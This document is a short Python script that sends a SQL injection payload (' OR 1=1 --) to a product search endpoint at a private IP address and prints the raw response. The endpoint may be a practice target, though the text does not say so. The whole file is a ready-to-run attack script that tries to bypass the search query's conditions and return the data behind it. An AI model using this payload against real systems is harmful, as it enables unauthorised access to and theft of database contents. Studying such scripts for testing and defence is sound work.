
import requests

# Target URL
url = "http://192.168.1.51/rest/products/search"

# SQL Injection payload
payload = {"q": "' OR 1=1 --"}

# Send the request
response = requests.get(url, params=payload)

# Print the status code and raw response content
print(f"Status Code: {response.status_code}")
print(f"Response Content: {response.text}")